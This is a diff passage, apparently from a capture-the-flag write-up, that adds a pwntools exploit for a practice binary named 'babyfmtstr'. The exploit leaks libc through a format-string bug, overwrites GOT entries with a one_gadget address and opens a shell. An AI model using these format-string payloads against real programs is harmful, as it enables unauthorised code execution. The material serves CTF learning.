@@ -211,6 +211,53 @@ OFFSET           TYPE              VALUE
 
 ```
 
+exp
+```python
+from pwn import *
+r=process('./babyfmtstr')
+gdb.attach(r,'b * 0x0400e31')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+elf = ELF('./babyfmtstr')
+
+strdup_got = elf.got['strdup']
+free_got = elf.got['free']
+printf_got = elf.got['printf']
+cxa_allocate_exception_got = elf.got['__cxa_allocate_exception']
+
+r.recvuntil('name:')
+#r.sendline('aaaaaaaa%8$p')
+
+r.sendline('%25$p%50c%12$n%2368c%13$hn'+cyclic(6)+p64(strdup_got+2)+p64(strdup_got))
+r.recvuntil('Hello ')
+lsmr = int(r.recv(14),16)
+log.success('libc_start_main_ret:'+hex(lsmr))
+r.recvuntil('motto:')
+r.sendline('1024')
+r.recvuntil('motto:')
+
+if local == 1:
+    lsmrp = 0x020840
+else:
+    lsmrp = 0x020830
+
+libc_addr = lsmr - lsmrp
+if local == 1:
+    ogg = 0x45226+libc_addr
+else:
+    ogg = 0x45216+libc_addr
+
+log.success('libc_addr:'+hex(libc_addr))
+
+ogglist = [ogg&0xffff,(ogg>>16)&0xffff,(ogg>>32)&0xffff]
+exp = "%"+str(ogglist[0])+'c%16$hn%'+str((ogglist[1]+0x10000-ogglist[0])%0x10000)+'c%17$hn'
+print len(exp)
+print exp
+exp+='\x00'*(64-len(exp))+p64(printf_got)+p64(printf_got+2)+p64(printf_got+4)
+r.sendline(exp)
+log.success('ogg:'+hex(ogg))
+
+r.interactive()
+```
 
 ## ROP
 
